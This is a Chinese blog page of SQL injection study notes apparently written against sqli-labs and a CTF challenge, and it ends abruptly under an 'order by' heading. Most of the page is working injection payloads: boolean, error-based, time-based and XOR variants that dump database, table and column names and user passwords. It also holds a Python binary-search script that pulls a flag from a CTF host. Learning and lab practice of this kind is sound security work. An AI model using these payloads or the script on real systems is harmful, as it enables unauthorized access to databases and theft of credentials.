
<!DOCTYPE html>
<html lang="en" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>sql - Hexo</title>
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="Fechin,"> 
    <meta name="description" content="[TOC]
知识点测试查询语句不能有引号，因此要把前面的语句给闭合了，查询后面的
检测闭合方式
先用’    “  ‘)  “) 等来测试，使页面报错，再根据页面报错信息来判断闭合方式
然后利用注释,"> 
    <meta name="author" content="John Doe"> 
    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
    <link rel="icon" href="/img/85E0B2FE93C1D59651632D67AC59568B.png"> 
    
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">

    
<link rel="stylesheet" href="/css/diaspora.css">

<meta name="generator" content="Hexo 5.4.0"></head>

<body class="loading">
    <span id="config-title" style="display:none">Hexo</span>
    <div id="loader"></div>
    <div id="single">
    <div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
    <div title="播放/暂停" class="iconfont icon-play"></div>
    <h3 class="subtitle">sql</h3>
    <div class="social">
        <div>
            <div class="share">
                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
            </div>
            <div id="qr"></div>
        </div>
    </div>
    <div class="scrollbar"></div>
</div>

    <div class="section">
        <div class="article">
    <div class='main'>
        <h1 class="title">sql</h1>
        <div class="stuff">
            <span>十二月 26, 2021</span>
            
  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/sql/" rel="tag">sql</a></li></ul>


        </div>
        <div class="content markdown">
            <p>[TOC]</p>
<h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a><strong>知识点</strong></h1><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>查询语句不能有引号，因此要把前面的语句给闭合了，查询后面的</p>
<h3 id="检测闭合方式"><a href="#检测闭合方式" class="headerlink" title="检测闭合方式"></a>检测闭合方式</h3><ol>
<li>先用’    “  ‘)  “) 等来测试，使页面报错，再根据页面报错信息来判断闭合方式</li>
<li>然后利用注释，使页面回显正常</li>
</ol>
<h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p>判断注入方式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1 正确</span><br><span class="line">id=1&#x27; 错误</span><br><span class="line">id=1&#x27;--+ 视报错情况而定</span><br></pre></td></tr></table></figure>

<p>猜测参数闭合方式,然后采用闭合方式的后半部分将语句闭合，直到页面回显正常</p>
<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>数据不能回显到前端页面</p>
<h3 id="•基于布尔-SQL-盲注-（页面仅显示正确与不正确）"><a href="#•基于布尔-SQL-盲注-（页面仅显示正确与不正确）" class="headerlink" title="•基于布尔 SQL 盲注 （页面仅显示正确与不正确）"></a>•基于布尔 SQL 盲注 （页面仅显示正确与不正确）</h3><h4 id="▲left"><a href="#▲left" class="headerlink" title="▲left"></a>▲left</h4><p> <strong>left(database(),1)&gt;’s’ //left()函数 Explain:database()显示数     据库名称</strong>，</p>
<p>left(a,b)从左侧截取 a 的前 b 位 </p>
<p><strong>测试正确与不正确时候的回显</strong></p>
<p><strong>后面语句为真则返回为真，后面语句错误则返回为假</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27and%20left(version(),1)=5%23（通过数据可的版本号）</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">猜数据库名</span><br><span class="line">?id=1%27and%20length(database())=8%23</span><br><span class="line">?id=1%27and%20left(database(),1)&gt;%27a%27--+</span><br><span class="line">得知第一位为S，测试第二位</span><br><span class="line">?id=1%27and%20left(database(),2)&gt;%27sa%27--+</span><br><span class="line"></span><br><span class="line">猜表名</span><br><span class="line">（第一个表名）</span><br><span class="line">?id=1&quot; and left((select table_name from information_schema.tables where table_schema = &#x27;security&#x27; limit 0,1),1)&gt;&#x27;l&#x27; --+</span><br><span class="line">（第二个表名）</span><br><span class="line">?id=1&quot; and left((select table_name from information_schema.tables where table_schema = &#x27;security&#x27; limit 1,1),1)&gt;&#x27;r&#x27; --+</span><br><span class="line"></span><br><span class="line">猜列名</span><br><span class="line">?id=1&quot; and left((select column_name from information_schema.columns where table_name = &#x27;users&#x27; limit 0,1),1)&gt;&#x27;l&#x27; --+</span><br></pre></td></tr></table></figure>

<p><strong>limit 0,x  显示查询结果中的x行</strong></p>
<h4 id="▲ascii-substr"><a href="#▲ascii-substr" class="headerlink" title="▲ascii() substr()"></a>▲ascii() substr()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">表名</span><br><span class="line">ascii(substr((select table_name information_schema.tables where tables_schema =database()limit 0,1),1,1))=101 --+ （第一个表的第一个字符）</span><br><span class="line">id=1%27and%20ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),2,1))%3E108--+（第一个表的第二个字符）</span><br><span class="line">第二个表</span><br><span class="line">?id=1%27and%20ascii(substr((select%20table_name%20from%20i</span><br><span class="line">nformation_schema.tables%20where%20table_schema=database()%20limit%201,1),1,1))%3E113</span><br><span class="line">--+</span><br></pre></td></tr></table></figure>

<p>//substr()函数，ascii()函数 Explain：substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换 为 ascii 值 </p>
<h4 id="▲ascii-substr-select-database-1-1-98"><a href="#▲ascii-substr-select-database-1-1-98" class="headerlink" title="▲ascii(substr((select database()),1,1))=98"></a>▲<strong>ascii(substr((select database()),1,1))=98</strong></h4><h4 id="▲ord-mid"><a href="#▲ord-mid" class="headerlink" title="▲ord() mid()"></a>▲ord() mid()</h4><p><strong>ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))&gt;98%23</strong></p>
<p> //ORD()函数，MID()函数 Explain：mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位 Ord()函数同 ascii()，将字符转为 ascii 值 </p>
<h4 id="▲regexp-正则注入"><a href="#▲regexp-正则注入" class="headerlink" title="▲regexp 正则注入"></a>▲<strong>regexp 正则注入</strong></h4><p>正则注入介绍：<a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/articles/5717442.html">http://www.cnblogs.com/lcamry/articles/5717442.html</a> </p>
<p><strong>用法介绍</strong>：<strong>select user() regexp ‘^[a-z]’;</strong> </p>
<p>Explain：正则表达式的用法，user()结果为 root，regexp 为匹配 root 的正则表达式。 第二位可以用 select user() regexp ‘^ro’来进行。 Mysql 注入—sqlilabs—lcamry 19 当正确的时候显示结果为 1，不正确的时候显示结果为 0. </p>
<p><strong>示例介绍：</strong> </p>
<p>select * from users where id=1 and 1=(if((user() regexp ‘^r’),1,0)); </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and 1=(user() regexp&#x27;^ri&#x27;); </span><br></pre></td></tr></table></figure>

<p>通过 <strong>if 语句</strong>的条件判断，返回一些条件句，比如 if 等构造一个判断。根据返回结果是否等 于 0 或者 1 进行判断。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> select * from users where id=1 and 1=(select 1 from information_schema.tables where table_schema=&#x27;security&#x27; and table_name regexp &#x27;^us[a-z]&#x27; limit 0,1); </span><br><span class="line"> </span><br><span class="line"> ?id=1&#x27; and 1=(select 1 from information_schema.columns where</span><br><span class="line">table_name=&#x27;users&#x27; and column_name regexp &#x27;^username&#x27; limit 0,1)--+</span><br><span class="line"> </span><br></pre></td></tr></table></figure>

<p>这里利用 <strong>select</strong> 构造了一个判断语句。我们只需要更换 regexp 表达式即可 ‘^u[a-z]’ -&gt; ‘^us[a-z]’ -&gt; ‘^use[a-z]’ -&gt; ‘^user[a-z]’ -&gt; FALSE </p>
<p>如何知道匹配结束了？这里大部分根据一般的命名方式（经验）就可以判断。但是如何你在 无法判断的情况下，可以用 table_name regexp ‘^username$’来进行判断。^是从开头进行 匹配，$是从结尾开始判断。更多的语法可以参考 mysql 使用手册进行了解。 </p>
<p>好，这里思考一个问题？ table_name 有好几个，我们只得到了一个 user，如何知道其 他的？</p>
<p> 这里可能会有人认为使用 limit 0，1 改为 limit 1,1。</p>
<p> 但是这种做法是错误的，limit 作用在前面的 select 语句中，而不是 regexp。那我们该如 何选择。其实在 regexp 中我们是取匹配 table_name 中的内容，只要 table_name 中有的内 容，我们用 regexp 都能够匹配到。因此上述语句不仅仅可以选择 user，<strong>还可以匹配其他项</strong>。 </p>
<p>基本注入语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select (select语句) regexp &#x27;正则&#x27;</span><br></pre></td></tr></table></figure>

<p>接着进行正则注入，若匹配则返回1，不匹配返回0</p>
<p>regexp这个关键字还可以代替where条件里的=号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select (select user_pass from users where user_id = 1) regexp &#x27;^a&#x27;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过滤了=、in、like</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select (select user_pass from users where user_id = 1) regexp &#x27;bd3$&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h4 id="▲like"><a href="#▲like" class="headerlink" title="▲like"></a>▲like</h4><p>匹配注入 和上述的正则类似，mysql 在匹配的时候我们可以用 ike 进行匹配。 </p>
<p>用法：select user() like ‘ro%’</p>
<h3 id="•基于报错的-SQL-盲注-（页面会爆出相关语法错误）"><a href="#•基于报错的-SQL-盲注-（页面会爆出相关语法错误）" class="headerlink" title="•基于报错的 SQL 盲注 （页面会爆出相关语法错误）"></a>•基于报错的 SQL 盲注 （页面会爆出相关语法错误）</h3><h4 id="▲floor"><a href="#▲floor" class="headerlink" title="▲floor"></a>▲floor</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">**Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;** </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">库名</span><br><span class="line">?id=1&#x27; union select count(*),0,concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2))as a from information_schema.tables group by a limit 0,10 --+</span><br><span class="line"></span><br><span class="line">?id=1&#x27; union select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+</span><br><span class="line"></span><br><span class="line">表名</span><br><span class="line">?id=1&#x27; union select null,count(*),concat((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</span><br><span class="line"></span><br><span class="line">列名</span><br><span class="line">?id=1&#x27; union select null,count(*),concat((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 7,1),floor(rand()*2))as a from information_schema.tables group by a%23</span><br><span class="line"></span><br><span class="line">爆值</span><br><span class="line">?id=1&#x27; union select null,count(*),concat((select username from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a%23</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">字段数</span><br><span class="line">?id=1&#x27; order by 4--+</span><br><span class="line"></span><br><span class="line">数据库</span><br><span class="line">1&#x27; union all select count(*),2,concat( &#x27;~&#x27;,(select schema_name from information_schema.schemata limit 4,1),&#x27;~&#x27;,floor(rand()*2)) as a from information_schema.schemata group by a %23</span><br><span class="line"></span><br><span class="line">表名</span><br><span class="line">1&#x27; union all select count(*),2,concat( &#x27;~&#x27;,(select table_name from information_schema.tables where table_schema = &#x27;security&#x27; limit 3,1),&#x27;~&#x27;,floor(rand()*2)) as a from information_schema.schemata group by a %23</span><br><span class="line"></span><br><span class="line">列名</span><br><span class="line">1&#x27; union all select count(*),1,concat( &#x27;~&#x27;,(select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 2,1),&#x27;~&#x27;,floor(rand()*2)) as a from information_schema.schemata group by a %23 </span><br><span class="line"></span><br><span class="line">爆值</span><br><span class="line">1&#x27; union all select count(*),1,concat( &#x27;~&#x27;,(select concat(id,username,password) from users limit 2,1),&#x27;~&#x27;,floor(rand()*2)) as a from information_schema.schemata group by a %23 </span><br><span class="line"></span><br><span class="line">a&#x27;) union select 1,2 from (select count(*),concat((select concat(username,0x3a, 0x3a,password,0x3a, 0x3a) from security.users limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a #</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名：&#x27;union select 1 from (select count(*),concat((select database()),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line"></span><br><span class="line">爆表名：&#x27;union select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line"></span><br><span class="line">爆列名：&#x27;union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&quot;TABLE_NAME&quot; limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line"></span><br><span class="line">爆数据：&#x27;union select 1 from (select count(*),concat((select COLUMN_NAME from TABLE_NAME limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用concat聚合函数<br>参考资料：<a target="_blank" rel="noopener" href="http://www.2cto.com/article/201303/192718.html">http://www.2cto.com/article/201303/192718.html</a></p>
<p>简单的说，使用聚合函数进行双注入查询时，会在错误信息中显示一部分错误信息。</p>
<p>比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。</p>
<p>双注： 当查询语句的前面出现聚合函数 就是多个返回结果count()就是多行的意思 后面的查询结果代码会以错误的形式显示出来</p>
<p>//explain:此处有三个点，一是需要 concat 计数，二是 floor，取得 0 or 1，进行数据的 重复，三是 group by 进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时 重复造成的错误。也有解释为 mysql 的 bug 的问题。但是此处需要将 rand(0)，rand()需 要多试几次才行。</p>
<p> 以上语句可以简化成如下的形式。</p>
<p> select count(*) from information_schema.tables group by concat(version(), floor(rand(0)*2)) </p>
<p>如果关键的表被禁用了，可以使用这种形式 </p>
<p>select count(*) from (select 1 union select null union select !1) group by concat(version(),floor(rand(0)*2)) </p>
<p>如果 rand 被禁用了可以使用用户变量来报错 </p>
<p>select min(@a:=1) from information_schema.tables group by concat(passwo rd,@a:=(@a+1)%2)</p>
<h4 id="▲-double-数值类型超出范围进行报错注入"><a href="#▲-double-数值类型超出范围进行报错注入" class="headerlink" title="▲ double 数值类型超出范围进行报错注入"></a>▲ double 数值类型超出范围进行报错注入</h4><p><strong>select exp(~(select * FROM(SELECT USER())a))</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; union select (exp(~(select * FROM(SELECT USER())a))),2, 3--+</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">表名</span><br><span class="line">select exp(~(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));</span><br><span class="line"></span><br><span class="line">列名</span><br><span class="line">select exp(~(select*from(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1)x));</span><br><span class="line"></span><br><span class="line">爆值</span><br><span class="line">select exp(~ (select*from(select concat_ws(&#x27;:&#x27;,id, username, password) from users limit 0,1)x));</span><br></pre></td></tr></table></figure>

<p>//double 数值类 型超出范围 //Exp()为以 e 为底的对数函数；版本在 5.5.5 及其以上 可以参考 exp 报错文章：<a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/articles/5509124.html">http://www.cnblogs.com/lcamry/articles/5509124.html</a> </p>
<h4 id="▲双注"><a href="#▲双注" class="headerlink" title="▲双注"></a>▲双注</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">数据库</span><br><span class="line">1&quot; union select count(*),2,concat_ws(char(58),(select version()) ,floor(rand(0)*2)) a from information_schema.schemata group by a %23</span><br><span class="line"></span><br><span class="line">获取表</span><br><span class="line">1&quot; union all select count(*),1,concat(&#x27;~&#x27;, (select schema_name from information_schema.schemata limit 4,1),floor(rand(0)*2)) a from information_schema.schemata group by a %23</span><br><span class="line"></span><br><span class="line">获取数据</span><br><span class="line">1&quot; union all select count(*),1,concat(&#x27;~&#x27;,(select concat(username,password) from users limit 0,1),&#x27;~&#x27;,floor(rand(0)*2)) a from information_schema.tables group by a %23</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="▲bigint"><a href="#▲bigint" class="headerlink" title="▲bigint"></a>▲bigint</h4><p><strong>select !(select * from (select user())x) -（ps:这是减号） ~0</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">表名</span><br><span class="line">!(select*from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x)-~0</span><br><span class="line"></span><br><span class="line">列名</span><br><span class="line">select !(select*from(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1)x)-~0;</span><br><span class="line"></span><br><span class="line">爆值</span><br><span class="line">!(select*from(select concat_ws(&#x27;:&#x27;,id, username, password) from users limit 0,1)x)-~0;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>//bigint 超出范围；~0 是对 0 逐位取反，很大的版本在 5.5.5 及其以上 Mysql 注入—sqlilabs—lcamry 21 可以参考文章 bigint 溢出文章 <a target="_blank" rel="noopener" href="http://www.cnblogs.com/lcamry/articles/5509112.html">http://www.cnblogs.com/lcamry/articles/5509112.html</a> </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43902454/article/details/96495984">(61条消息) 基于BIGINT溢出错误的SQL注入_乌拉那拉氏狂徒的博客-CSDN博客</a></p>
<h4 id="▲extractvalue"><a href="#▲extractvalue" class="headerlink" title="▲extractvalue"></a>▲extractvalue</h4><p><strong>extractvalue(1,concat(0x7e,(select @@version),0x7e)) se</strong></p>
<p>//mysql 对 xml 数据进 行查询和修改的 xpath 函数，xpath 语法错误 </p>
<h4 id="▲updatexml"><a href="#▲updatexml" class="headerlink" title="▲updatexml"></a>▲updatexml</h4><p><strong>updatexml(1,concat(0x7e,(select @@version),0x7e),1)</strong> //mysql 对 xml 数据进行 查询和修改的 xpath 函数，xpath 语法错误 </p>
<h4 id="▲重复性"><a href="#▲重复性" class="headerlink" title="▲重复性"></a>▲重复性</h4><p><strong>select * from (select</strong> <strong>NAME_CONST(version(),1),NAME_CONST(version(),1))x;</strong> //mysql 重复特性，此处重复了 version，所以报错</p>
<h3 id="•基于时间的-SQL-盲注（适合大多情况，页面没变化）"><a href="#•基于时间的-SQL-盲注（适合大多情况，页面没变化）" class="headerlink" title="•基于时间的 SQL 盲注（适合大多情况，页面没变化）"></a>•基于时间的 SQL 盲注（适合大多情况，页面没变化）</h3><p>在探测参数闭合方式的时候可以，可以构造if语句，根据时间来判断是否正确。</p>
<h4 id="▲sleep"><a href="#▲sleep" class="headerlink" title="▲sleep"></a>▲sleep</h4><p><strong>If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</strong> </p>
<p>//if 判断语句，条件为假， 执行 sleep Ps：遇到以下这种利用 sleep()延时注入语句 select sleep(find_in_set(mid(@@version, 1, 1), ‘0,1,2,3,4,5,6,7,8, 9,.’)); 该语句意思是在 0-9 之间找版本号的第一位。但是在我们实际渗透过程中，这种用法是不可 取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">判断数据库名的长度</span><br><span class="line"> http://xxxxxx?id=1 and if(length(database())&gt;=6,sleep(5),1) </span><br><span class="line">爆库名</span><br><span class="line"> http://xxxxxxx?id=1 and if(substr(database(),1,1)=&#x27;a&#x27;,sleep(5),1)   数据库名为 test </span><br><span class="line">爆表名</span><br><span class="line"> http://xxxxxxx?id=1 and if(substr((select table_name from information_schema.tables where table_schema=&#x27;test&#x27; limit 0,1),1,1)=&#x27;a&#x27;,sleep(5),1)  表名 </span><br><span class="line">爆字段</span><br><span class="line">  http://xxxxxxx?id=1 and if(substr((select column_name from information_schema.columns where table_schema=&#x27;test&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1)=&#x27;a&#x27;,sleep(5),1)  </span><br><span class="line">爆数据 </span><br><span class="line"> http://xxxxxxxxxx?id=1 and if(substr(select username from test.users limit 0,1),1,1)=&#x27;a&#x27;,sleep(5),1) 由于数据库名的范围一般在 a~z,0~9，特殊字符，大小写等</span><br></pre></td></tr></table></figure>



<h4 id="▲BENCHMARK"><a href="#▲BENCHMARK" class="headerlink" title="▲BENCHMARK"></a>▲BENCHMARK</h4><p><strong>UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘M SG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;</strong> </p>
<p>//BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达 式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执 行成功。这是一种边信道攻击，在运行过程中占用大量的 cpu 资源。推荐使用 sleep() 函数进行注入</p>
<h2 id="异或注入"><a href="#异或注入" class="headerlink" title="异或注入"></a>异或注入</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1^1=0 0^0=0 0^1=1`</span><br><span class="line">`1^1^1=0 1^1^0=0`</span><br><span class="line">构造payload:`&#x27;^ascii(mid(database(),1,1)=98)^0</span><br></pre></td></tr></table></figure>

<p>注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的</p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://116b4987-7158-432b-a5f2-f3b0154b1157.node3.buuoj.cn/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">	<span class="string">&quot;id&quot;</span> : <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">	l = <span class="number">32</span></span><br><span class="line">	r =<span class="number">128</span></span><br><span class="line">	mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">	<span class="keyword">while</span>(l&lt;r):</span><br><span class="line">		payload[<span class="string">&quot;id&quot;</span>] = <span class="string">&quot;0^(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">		ly0n = requests.post(url,data=payload)</span><br><span class="line">		<span class="comment">#print(payload)</span></span><br><span class="line">		<span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> ly0n.text:</span><br><span class="line">			l = mid+<span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			r = mid</span><br><span class="line">		mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">chr</span>(mid)==<span class="string">&quot; &quot;</span>):</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	result = result + <span class="built_in">chr</span>(mid)</span><br><span class="line">	<span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag: &quot;</span> ,result)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;^(ascii(mid((password)from(i)))&gt;j)^&#x27;1&#x27;=&#x27;1&#x27;%23</span><br><span class="line">或者</span><br><span class="line">admin&#x27;^(ascii(mid((password)from(i)for(1)))&gt;j)^&#x27;1&#x27;=&#x27;1&#x27;%23</span><br></pre></td></tr></table></figure>

<p>0^1^0 <em>–&gt; 1 语句返回为真</em> 0^0^0 <em>–&gt; 0 语句返回为假</em></p>
<h4 id="过滤了关键字：and、or过滤了逗号，过滤了空格"><a href="#过滤了关键字：and、or过滤了逗号，过滤了空格" class="headerlink" title="过滤了关键字：and、or过滤了逗号，过滤了空格"></a>过滤了关键字：and、or过滤了逗号，过滤了空格</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;^(ascii(mid((password)from(i)))&gt;j)^(&#x27;2&#x27;&gt;&#x27;1&#x27;)%23</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>如果这里过滤了%号和注释符的话，那就把最后一个引号去掉就可以和后面的引号匹配了 ‘1’=’1</strong></p>
<h2 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="order by盲注"></a>order by盲注</h2><p>基本注入</p>
